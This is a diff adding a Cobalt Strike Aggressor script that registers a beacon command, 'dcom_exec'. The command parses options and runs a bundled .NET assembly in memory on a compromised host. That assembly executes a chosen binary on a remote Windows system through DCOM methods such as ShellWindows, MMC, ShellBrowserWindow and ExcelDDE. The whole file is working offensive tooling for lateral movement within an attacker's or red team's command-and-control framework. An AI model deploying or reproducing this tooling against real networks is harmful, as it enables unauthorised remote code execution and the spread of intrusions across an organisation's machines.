@@ -1,0 +1,198 @@
+#	ALIAS:	DCOM_EXEC
+# $1 => Beacon ID
+# $2 => DCOM Method
+# $3 => System
+# $4 => Command
+# $5 => Arguments
+
+sub funct_dcom_exec_argparse {
+	global('$safety');
+	@param = @('-m','-s','-c', '-a');
+	if (iff($2 in @param, true, false)) {
+		if ($2 eq '-m') {
+			return %(idx => '1', arg => $3);
+		}
+		else if ($2 eq '-s') {
+			return %(idx => '2', arg => $3);
+		}
+		else if ($2 eq '-c') {
+			return %(idx => '3', arg => $3);
+		}
+		else if ($2 eq '-a'){
+			return %(idx => '4', arg => $3);
+		}
+	}
+	else {
+		berror($1, "Not a valid Parameter; Allowed Parameters: -m, -s, -c, -a");
+		$safety = "False";
+		return;
+	}
+}
+
+alias("assembly dcom_exec", {
+		local('$bid %arg1 %arg2 %arg3 %arg4');
+		global('@params $dcomm $dcoms $dcomc $dcoma $deargs $safety');
+		clear('@params');
+		
+		# Check for Number of Arguements
+		if (size(@_) > 10) {
+			berror($1, "dcom_exec: Too many arguments");
+			beacon_command_detail("dcom_exec");
+			return;
+		}
+		
+		if (size(@_) < 4) {
+			berror($1, "dcom_exec: not enough parameters/arguments");
+			beacon_command_detail("dcom_exec");
+			return;
+		}
+		else if (size(@_) > 10) {
+			berror($1, "dcom_exec: too many parameter/arguments supplied");
+			beacon_command_detail("dcom_exec");
+			return;
+		}
+		else if (size(@_) >= 4) {
+			if (iff("-c" in @_, false, true)) {
+				berror($1, "dcom_exec: '-c' is a required parameter");
+				beacon_command_detail("dcom_exec");
+				return;
+			}
+		}
+		
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Executing Binary via DCOM ]");
+			
+			# Beginning Task
+			btask($1, "Executing Binary via DCOM (T000)", "T000");
+			
+			# Log Tasking to Event Log.
+			elog("\cC[+] Executing Binary via DCOM on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+			# Print Information to Script Console.
+			println(
+				"\nPRINTED INFORMATION: DCOM_EXEC => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nExecuting Binary via DCOM."
+			);
+			
+			# Print Results to Beacon Console.
+			# Parse Arguments
+			
+			%arg1 = funct_dcom_exec_argparse($1, $3, $4);
+			push(@params, %arg1);
+			
+			if ($5 ne $null || $6 ne $null) {
+				%arg2 = funct_dcom_exec_argparse($1, $5, $6);
+				push(@params, %arg2);
+			}
+			else {
+				%arg2 = %(idx => '1', arg => "SHELLWINDOWS");
+				push(@params, %arg2);
+			}
+			
+			if ($7 ne $null || $8 ne $null){
+				%arg3 = funct_dcom_exec_argparse($1, $7, $8);
+				push(@params, %arg3);
+			}
+			else {
+				%arg3 = %(idx => '2', arg => "");
+				push(@params, %arg3);
+			}
+			
+			if ($9 ne $null || $10 ne $null){
+				%arg4 = funct_dcom_exec_argparse($1, $9, $10);
+				push(@params, %arg4);
+			}
+			else {
+				%arg4 = %(idx => '4', arg => "");
+				push(@params, %arg4);
+			}
+			
+			sort({ return $1['idx'] <=> $2['idx'];}, @params);
+			
+			foreach $argument (@params) {
+				if ($argument['idx'] eq '1'){
+					if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+						$dcomm = $argument['arg'];
+					}
+					else {
+						$dcomm = "SHELLWINDOWS";
+					}
+				}
+				else if ($argument['idx'] eq '2'){
+					if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+						$dcoms = $argument['arg'];
+					}
+					else {
+						$dcoms = $null;
+					}
+				}
+				else if ($argument['idx'] eq '3'){
+						$dcomc = $argument['arg'];
+				}
+				else if ($argument['idx'] eq '4'){
+					if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+						$dcoma = $argument['arg'];
+					}
+					else {
+						$dcoma = $null;
+					}
+				}
+			}
+			
+			if ($dcoms ne "" || $dcoms ne $null) {
+				if ($dcoma ne "" || $dcoma ne $null) {
+					$deargs = "-m $dcomm -s $dcoms -c $dcomc -a $dcoma";
+				}
+				else {
+					$deargs = "-m $dcomm -s $dcoms -c $dcomc";
+				}
+			}
+			else {
+				if ($dcoma ne "" || $dcoma ne $null) {
+					$deargs = "-m $dcomm -c $dcomc -a $dcoma";
+				}
+				else {
+					$deargs = "-m " . $dcomm ." -c " . $dcomc;
+				}
+			}
+			
+			if (-is64 $1) {
+				if ("x86" !isin beacon_info($1, "barch")) {
+					bexecute_assembly($1, script_resource("_assemblies/dcom_exec/dcom_exec_x64_3.5.exe"), $deargs);
+				}
+				else {
+					bexecute_assembly($1, script_resource("_assemblies/dcom_exec/dcom_exec_x86_3.5.exe"), $deargs);
+				}
+			}
+			else{
+				bexecute_assembly($1, script_resource("_assemblies/dcom_exec/dcom_exec_x86_3.5.exe"), $deargs);
+			}
+
+			# Task Complete
+			
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: DCOM_EXEC => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nDCOM_EXEC: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "DCOM_EXEC: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: DCOM_EXEC
+beacon_command_register(
+	"assembly dcom_exec",
+	"\cD" . "[*] .NET \(3.5\): Executes Binary via DCOM" . "\o",
+	"Synopsis: dcom_exec [-m <Method>] [-s <System>] [-c <CommandFullPath>] [-a <Arguments>]\n\nExecutes a binary with arguments using a DCOM method. \(See supported methods\)\n\nSupported Methods:\n\tShellWindows \(*Default\)\n\tMMC\n\tShellBrowserWindow\n\tExcelDDE"
+ );
